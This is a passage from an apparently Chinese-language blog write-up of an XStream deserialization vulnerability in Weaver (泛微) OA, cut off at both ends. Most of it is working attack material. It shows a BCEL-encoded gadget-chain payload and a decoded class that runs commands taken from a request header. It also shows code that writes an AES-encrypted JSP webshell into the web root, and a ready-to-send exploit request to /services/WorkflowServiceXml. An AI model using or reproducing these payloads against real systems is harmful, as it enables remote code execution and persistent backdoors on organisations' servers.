94$aa$9a$a9uP$60P$b0$3a$Z$aa$9b$5d5$3fc$cd$J$sf$d60$b1$i$d6$5e$c5$ba$e8$fa$i6t$e9$a6j2$40$db$r$d4$cay$e3$VTE$ef$a2$df$x2$e7$i6$fd$c0$TFp$j$7f$f2$D$a0$S$ed$3c$e3$m$9a8$g$94$d6$a3$O$N0$d1$88MX$818$a2$e8$e6$de$3e$ac$c4a$7ea$8c$60$V$a6$d0$823h$c5$Fj$5d$c2j$fc$c8$_$8a$ebXOokq$D$eb$f0$X6$60$h$bd$cd$d3$9f$89$ef$b1$j$3b$Yo$T$beC$H$fdU$f0$7f$Z$9d$d8$c9$c8$dd$ec$fc$f7$e0$5eF$3d$cc7$d4$7d$94U1$82$c7O$a58k$3f$85$d3x$A$PBe$a4$3e$3cD$99$c6x$3b$f10v$a1$86Q$5b$d0$85$dd$fc$g$baA$fbn$3c$c2$Y$c4$K$7b$f0$u$e7$bd$fc$3b$88$dc$c4$ef$a8U$d1$a3b$9f$8a$5e$V$7d$w$f6$87$p$9f$fb$c3$f1$80$8a$83P$b8$baI$fb$ff$a1Z$R$ae$O$dcd$a6$b4$ea$91$c3$a1$IM$P3$60$F$k$fb$X$9f$s$83$aa$ec$J$A$A</span><br><span class="line">&lt;&#x2F;string&gt;</span><br><span class="line">                    &lt;&#x2F;a&gt;</span><br><span class="line">                  &lt;&#x2F;outer-class&gt;</span><br><span class="line">                &lt;&#x2F;names&gt;</span><br><span class="line">                &lt;processorCL class&#x3D;&#39;com.sun.org.apache.bcel.internal.util.ClassLoader&#39;&gt;</span><br><span class="line">                  &lt;parent class&#x3D;&#39;sun.misc.Launcher$ExtClassLoader&#39;&gt;</span><br><span class="line">                  &lt;&#x2F;parent&gt;</span><br><span class="line">                  &lt;package2certs class&#x3D;&#39;hashtable&#39;&#x2F;&gt;</span><br><span class="line">                  &lt;classes defined-in&#x3D;&#39;java.lang.ClassLoader&#39;&#x2F;&gt;</span><br><span class="line">                  &lt;defaultDomain&gt;</span><br><span class="line">                    &lt;classloader class&#x3D;&#39;com.sun.org.apache.bcel.internal.util.ClassLoader&#39; reference&#x3D;&#39;..&#x2F;..&#39;&#x2F;&gt;</span><br><span class="line">                    &lt;principals&#x2F;&gt;</span><br><span class="line">                    &lt;hasAllPerm&gt;false&lt;&#x2F;hasAllPerm&gt;</span><br><span class="line">                    &lt;staticPermissions&gt;false&lt;&#x2F;staticPermissions&gt;</span><br><span class="line">                    &lt;key&gt;</span><br><span class="line">                    &lt;&#x2F;key&gt;</span><br><span class="line">                  &lt;&#x2F;defaultDomain&gt;</span><br><span class="line">&lt;domains class&#x3D;&quot;java.util.Collections$SynchronizedSet&quot; serialization&#x3D;&quot;custom&quot;&gt;</span><br><span class="line">        &lt;java.util.Collections_-SynchronizedCollection&gt;</span><br><span class="line">          &lt;default&gt;</span><br><span class="line">            &lt;c class&#x3D;&quot;set&quot;&gt;&lt;&#x2F;c&gt;</span><br><span class="line">            &lt;mutex class&#x3D;&quot;java.util.Collections$SynchronizedSet&quot; reference&#x3D;&quot;..&#x2F;..&#x2F;..&quot;&#x2F;&gt;</span><br><span class="line">          &lt;&#x2F;default&gt;</span><br><span class="line">        &lt;&#x2F;java.util.Collections_-SynchronizedCollection&gt;</span><br><span class="line">      &lt;&#x2F;domains&gt;                  &lt;packages&#x2F;&gt;</span><br><span class="line">                  &lt;nativeLibraries&#x2F;&gt;</span><br><span class="line">                  &lt;assertionLock class&#x3D;&#39;com.sun.org.apache.bcel.internal.util.ClassLoader&#39; reference&#x3D;&#39;..&#39;&#x2F;&gt;</span><br><span class="line">                  &lt;defaultAssertionStatus&gt;false&lt;&#x2F;defaultAssertionStatus&gt;</span><br><span class="line">                  &lt;classes&#x2F;&gt;</span><br><span class="line">                  &lt;ignored__packages&gt;</span><br><span class="line">                    &lt;string&gt;java.&lt;&#x2F;string&gt;</span><br><span class="line">                    &lt;string&gt;javax.&lt;&#x2F;string&gt;</span><br><span class="line">                    &lt;string&gt;sun.&lt;&#x2F;string&gt;</span><br><span class="line">                  &lt;&#x2F;ignored__packages&gt;</span><br><span class="line">                  &lt;repository class&#x3D;&#39;com.sun.org.apache.bcel.internal.util.SyntheticRepository&#39;&gt;</span><br><span class="line">                    &lt;__path&gt;</span><br><span class="line">                      &lt;paths&#x2F;&gt;</span><br><span class="line">                      &lt;class__path&gt;.&lt;&#x2F;class__path&gt;</span><br><span class="line">                    &lt;&#x2F;__path&gt;</span><br><span class="line">                    &lt;__loadedClasses&#x2F;&gt;</span><br><span class="line">                  &lt;&#x2F;repository&gt;</span><br><span class="line">                  &lt;deferTo class&#x3D;&#39;sun.misc.Launcher$ExtClassLoader&#39; reference&#x3D;&#39;..&#x2F;parent&#39;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;processorCL&gt;</span><br><span class="line">              &lt;&#x2F;iterator&gt;</span><br><span class="line">              &lt;type&gt;KEYS&lt;&#x2F;type&gt;</span><br><span class="line">            &lt;&#x2F;e&gt;</span><br><span class="line">            &lt;in class&#x3D;&#39;java.io.ByteArrayInputStream&#39;&gt;</span><br><span class="line">              &lt;buf&gt;&lt;&#x2F;buf&gt;</span><br><span class="line">              &lt;pos&gt;0&lt;&#x2F;pos&gt;</span><br><span class="line">              &lt;mark&gt;0&lt;&#x2F;mark&gt;</span><br><span class="line">              &lt;count&gt;0&lt;&#x2F;count&gt;</span><br><span class="line">            &lt;&#x2F;in&gt;</span><br><span class="line">          &lt;&#x2F;is&gt;</span><br><span class="line">          &lt;consumed&gt;false&lt;&#x2F;consumed&gt;</span><br><span class="line">        &lt;&#x2F;dataSource&gt;</span><br><span class="line">        &lt;transferFlavors&#x2F;&gt;</span><br><span class="line">      &lt;&#x2F;dataHandler&gt;</span><br><span class="line">      &lt;dataLen&gt;0&lt;&#x2F;dataLen&gt;</span><br><span class="line">    &lt;&#x2F;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference&#x3D;&#39;..&#x2F;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#39;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;java.util.PriorityQueue&gt;</span><br><span class="line">&lt;&#x2F;java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>​        使用BCEL编解码工具对这段内容解压。</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210513182334535.png" alt="image-20210513182334535"></p>
<p>​        内容如下,虽然calc成功执行了，但是后面的内容没有执行，可能是版本的问题，我在泛微8.0的resin中并没有找到TcpSocketLink类。但是在resin4.0中确实是存在的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fuckyou</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">fuckyou</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">            Class tcpsocketLinkClazz = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.network.listen.TcpSocketLink"</span>);</span><br><span class="line">            Method getCurrentRequestM = tcpsocketLinkClazz.getMethod(<span class="string">"getCurrentRequest"</span>);</span><br><span class="line">            Object currentRequest = getCurrentRequestM.invoke((Object)<span class="keyword">null</span>);</span><br><span class="line">            Field f = currentRequest.getClass().getSuperclass().getDeclaredField(<span class="string">"_responseFacade"</span>);</span><br><span class="line">            f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object response = f.get(currentRequest);</span><br><span class="line">            Method getWriterM = response.getClass().getMethod(<span class="string">"getWriter"</span>);</span><br><span class="line">            Writer w = (Writer)getWriterM.invoke(response);</span><br><span class="line">            w.write(<span class="string">"powered by potatso                      "</span>);</span><br><span class="line">            Method getHeaderM = currentRequest.getClass().getMethod(<span class="string">"getHeader"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            String cmd = (String)getHeaderM.invoke(currentRequest, <span class="string">"potats0"</span>);</span><br><span class="line">            Scanner s = (<span class="keyword">new</span> Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">            w.write(s.hasNext() ? s.next() : <span class="string">""</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">            var11.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210513182652660.png" alt="image-20210513182652660"></p>
<p>​        当然仅仅是calc并不满足实战的要求，现在有两个思路，一个思路是找到物理路径或者使用相对路径写shell，另一个思路就是直接写一个内存马。</p>
<h4 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h4><p>​        只要获取到网站的根目录，再去写文件就可以了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">getPath</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">getPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String resin = System.getProperty(<span class="string">"user.dir"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BufferedWriter out = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(resin + <span class="string">"\\..\\ecology\\SystemRightqroup.jsp"</span>));</span><br><span class="line">            out.write(<span class="string">"&lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(\"POST\"))&#123;String k=\"39236cce7e199d43\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;"</span>);</span><br><span class="line">            out.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var3) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        利用EXP</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="comment">//services/WorkflowServiceXml HTTP/1.1</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">90.0</span><span class="number">.4430</span><span class="number">.212</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://192.168.3.16/services</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: login_locale=zh_CN; APP_HOST=http%3A//192.168.3.16/; HOST=http%3A//192.168.3.16/; kodUserLanguage=zh-CN; __51uvsct__JH8lWQvr8bXXIzV9=1; __51vcke__JH8lWQvr8bXXIzV9=4ce68615-954c-58a4-8d5d-bed01c29329e; __51vuft__JH8lWQvr8bXXIzV9=1619142397702; kodUserID=1; X-CSRF-TOKEN=AUxx7UR4wqKjkpCWzwdR; kodVersionCheck=check-at-1619144929; avatarImageUrl=3855295783613973104; JSESSIONID=abc9LIHQgqQcNh8D8iLLx; testBanCookie=test</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">SOAPAction: </span></span><br><span class="line"><span class="comment">Content-Type: text/xml;charset=UTF-8</span></span><br><span class="line"><span class="comment">Host: 192.168.3.16</span></span><br><span class="line"><span class="comment">Content-Length: 32527</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn"&gt;</span></span><br><span class="line"><span class="comment">   &lt;soapenv:Header/&gt;</span></span><br><span class="line"><span class="comment">   &lt;soapenv:Body&gt;</span></span><br><span class="line"><span class="comment">      &lt;web:doCreateWorkflowRequest&gt;</span></span><br><span class="line"><span class="comment">         &lt;!--type: string--&gt;</span></span><br><span class="line"><span class="comment">         &lt;web:in0&gt;</span></span><br><span class="line"><span class="comment">&amp;lt;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#46;&amp;#117;&amp;#116;&amp;#105;&amp;#108;&amp;#46;&amp;#80;&amp;#114;&amp;#105;&amp;#111;&amp;#114;&amp;#105;&amp;#116;&amp;#121;&amp;#81;&amp;#117;&amp;#101;&amp;#117;&amp;#101;&amp;#32;&amp;#115;&amp;#101;&amp;#114;&amp;#105;&amp;#97;&amp;#108;&amp;#105;&amp;#122;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;apos;&amp;#99;&amp;#117;&amp;#115;&amp;#116;&amp;#111;&amp;#109;&amp;apos;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;lt;&amp;#117;&amp;#110;&amp;#115;&amp;#101;&amp;#114;&amp;#105;&amp;#97;&amp;#108;&amp;#105;&amp;#122;&amp;#97;&amp;#98;&amp;#108;&amp;#101;&amp;#45;&amp;#112;&amp;#97;&amp;#114;&amp;#101;&amp;#110;&amp;#116;&amp;#115;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;lt;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#46;&amp;#117;&amp;#116;&amp;#105;&amp;#108;&amp;#46;&amp;#80;&amp;#114;&amp;#105;&amp;#111;&amp;#114;&amp;#105;&amp;#116;&amp;#121;&amp;#81;&amp;#117;&amp;#101;&amp;#117;&amp;#101;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#100;&amp;#101;&amp;#102;&amp;#97;&amp;#117;&amp;#108;&amp;#116;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#115;&amp;#105;&amp;#122;&amp;#101;&amp;gt;&amp;#50;&amp;lt;&amp;#47;&amp;#115;&amp;#105;&amp;#122;&amp;#101;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#99;&amp;#111;&amp;#109;&amp;#112;&amp;#97;&amp;#114;&amp;#97;&amp;#116;&amp;#111;&amp;#114;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#102;&amp;#120;&amp;#46;&amp;#99;&amp;#111;&amp;#108;&amp;#108;&amp;#101;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#115;&amp;#46;&amp;#79;&amp;#98;&amp;#115;&amp;#101;&amp;#114;&amp;#118;&amp;#97;&amp;#98;&amp;#108;&amp;#101;&amp;#76;&amp;#105;&amp;#115;&amp;#116;&amp;#36;&amp;#49;&amp;apos;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#100;&amp;#101;&amp;#102;&amp;#97;&amp;#117;&amp;#108;&amp;#116;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#105;&amp;#110;&amp;#116;&amp;gt;&amp;#51;&amp;lt;&amp;#47;&amp;#105;&amp;#110;&amp;#116;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#99;&amp;#111;&amp;#109;&amp;#46;&amp;#115;&amp;#117;&amp;#110;&amp;#46;&amp;#120;&amp;#109;&amp;#108;&amp;#46;&amp;#105;&amp;#110;&amp;#116;&amp;#101;&amp;#114;&amp;#110;&amp;#97;&amp;#108;&amp;#46;&amp;#98;&amp;#105;&amp;#110;&amp;#100;&amp;#46;&amp;#118;&amp;#50;&amp;#46;&amp;#114;&amp;#117;&amp;#110;&amp;#116;&amp;#105;&amp;#109;&amp;#101;&amp;#46;&amp;#117;&amp;#110;&amp;#109;&amp;#97;&amp;#114;&amp;#115;&amp;#104;&amp;#97;&amp;#108;&amp;#108;&amp;#101;&amp;#114;&amp;#46;&amp;#66;&amp;#97;&amp;#115;&amp;#101;&amp;#54;&amp;#52;&amp;#68;&amp;#97;&amp;#116;&amp;#97;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#100;&amp;#97;&amp;#116;&amp;#97;&amp;#72;&amp;#97;&amp;#110;&amp;#100;&amp;#108;&amp;#101;&amp;#114;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#100;&amp;#97;&amp;#116;&amp;#97;&amp;#83;&amp;#111;&amp;#117;&amp;#114;&amp;#99;&amp;#101;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#99;&amp;#111;&amp;#109;&amp;#46;&amp;#115;&amp;#117;&amp;#110;&amp;#46;&amp;#120;&amp;#109;&amp;#108;&amp;#46;&amp;#105;&amp;#110;&amp;#116;&amp;#101;&amp;#114;&amp;#110;&amp;#97;&amp;#108;&amp;#46;&amp;#119;&amp;#115;&amp;#46;&amp;#101;&amp;#110;&amp;#99;&amp;#111;&amp;#100;&amp;#105;&amp;#110;&amp;#103;&amp;#46;&amp;#120;&amp;#109;&amp;#108;&amp;#46;&amp;#88;&amp;#77;&amp;#76;&amp;#77;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#36;&amp;#88;&amp;#109;&amp;#108;&amp;#68;&amp;#97;&amp;#116;&amp;#97;&amp;#83;&amp;#111;&amp;#117;&amp;#114;&amp;#99;&amp;#101;&amp;apos;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#99;&amp;#111;&amp;#110;&amp;#116;&amp;#101;&amp;#110;&amp;#116;&amp;#84;&amp;#121;&amp;#112;&amp;#101;&amp;gt;&amp;#116;&amp;#101;&amp;#120;&amp;#116;&amp;#47;&amp;#112;&amp;#108;&amp;#97;&amp;#105;&amp;#110;&amp;lt;&amp;#47;&amp;#99;&amp;#111;&amp;#110;&amp;#116;&amp;#101;&amp;#110;&amp;#116;&amp;#84;&amp;#121;&amp;#112;&amp;#101;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#105;&amp;#115;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#46;&amp;#105;&amp;#111;&amp;#46;&amp;#83;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#110;&amp;#99;&amp;#101;&amp;#73;&amp;#110;&amp;#112;&amp;#117;&amp;#116;&amp;#83;&amp;#116;&amp;#114;&amp;#101;&amp;#97;&amp;#109;&amp;apos;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#101;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#120;&amp;#46;&amp;#115;&amp;#119;&amp;#105;&amp;#110;&amp;#103;&amp;#46;&amp;#77;&amp;#117;&amp;#108;&amp;#116;&amp;#105;&amp;#85;&amp;#73;&amp;#68;&amp;#101;&amp;#102;&amp;#97;&amp;#117;&amp;#108;&amp;#116;&amp;#115;&amp;#36;&amp;#77;&amp;#117;&amp;#108;&amp;#116;&amp;#105;&amp;#85;&amp;#73;&amp;#68;&amp;#101;&amp;#102;&amp;#97;&amp;#117;&amp;#108;&amp;#116;&amp;#115;&amp;#69;&amp;#110;&amp;#117;&amp;#109;&amp;#101;&amp;#114;&amp;#97;&amp;#116;&amp;#111;&amp;#114;&amp;apos;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#105;&amp;#116;&amp;#101;&amp;#114;&amp;#97;&amp;#116;&amp;#111;&amp;#114;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#99;&amp;#111;&amp;#109;&amp;#46;&amp;#115;&amp;#117;&amp;#110;&amp;#46;&amp;#116;&amp;#111;&amp;#111;&amp;#108;&amp;#115;&amp;#46;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#99;&amp;#46;&amp;#112;&amp;#114;&amp;#111;&amp;#99;&amp;#101;&amp;#115;&amp;#115;&amp;#105;&amp;#110;&amp;#103;&amp;#46;&amp;#74;&amp;#97;&amp;#118;&amp;#97;&amp;#99;&amp;#80;&amp;#114;&amp;#111;&amp;#99;&amp;#101;&amp;#115;&amp;#115;&amp;#105;&amp;#110;&amp;#103;&amp;#69;&amp;#110;&amp;#118;&amp;#105;&amp;#114;&amp;#111;&amp;#110;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#36;&amp;#78;&amp;#97;&amp;#109;&amp;#101;&amp;#80;&amp;#114;&amp;#111;&amp;#99;&amp;#101;&amp;#115;&amp;#115;&amp;#73;&amp;#116;&amp;#101;&amp;#114;&amp;#97;&amp;#116;&amp;#111;&amp;#114;&amp;apos;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#110;&amp;#97;&amp;#109;&amp;#101;&amp;#115;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#46;&amp;#117;&amp;#116;&amp;#105;&amp;#108;&amp;#46;&amp;#65;&amp;#98;&amp;#115;&amp;#116;&amp;#114;&amp;#97;&amp;#99;&amp;#116;&amp;#76;&amp;#105;&amp;#115;&amp;#116;&amp;#36;&amp;#73;&amp;#116;&amp;#114;&amp;apos;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#99;&amp;#117;&amp;#114;&amp;#115;&amp;#111;&amp;#114;&amp;gt;&amp;#48;&amp;lt;&amp;#47;&amp;#99;&amp;#117;&amp;#114;&amp;#115;&amp;#111;&amp;#114;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#108;&amp;#97;&amp;#115;&amp;#116;&amp;#82;&amp;#101;&amp;#116;&amp;gt;&amp;#45;&amp;#49;&amp;lt;&amp;#47;&amp;#108;&amp;#97;&amp;#115;&amp;#116;&amp;#82;&amp;#101;&amp;#116;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#101;&amp;#120;&amp;#112;&amp;#101;&amp;#99;&amp;#116;&amp;#101;&amp;#100;&amp;#77;&amp;#111;&amp;#100;&amp;#67;&amp;#111;&amp;#117;&amp;#110;&amp;#116;&amp;gt;&amp;#48;&amp;lt;&amp;#47;&amp;#101;&amp;#120;&amp;#112;&amp;#101;&amp;#99;&amp;#116;&amp;#101;&amp;#100;&amp;#77;&amp;#111;&amp;#100;&amp;#67;&amp;#111;&amp;#117;&amp;#110;&amp;#116;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#111;&amp;#117;&amp;#116;&amp;#101;&amp;#114;&amp;#45;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#46;&amp;#117;&amp;#116;&amp;#105;&amp;#108;&amp;#46;&amp;#65;&amp;#114;&amp;#114;&amp;#97;&amp;#121;&amp;#115;&amp;#36;&amp;#65;&amp;#114;&amp;#114;&amp;#97;&amp;#121;&amp;#76;&amp;#105;&amp;#115;&amp;#116;&amp;apos;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#97;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#115;&amp;#116;&amp;#114;&amp;#105;&amp;#110;&amp;#103;&amp;#45;&amp;#97;&amp;#114;&amp;#114;&amp;#97;&amp;#121;&amp;apos;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;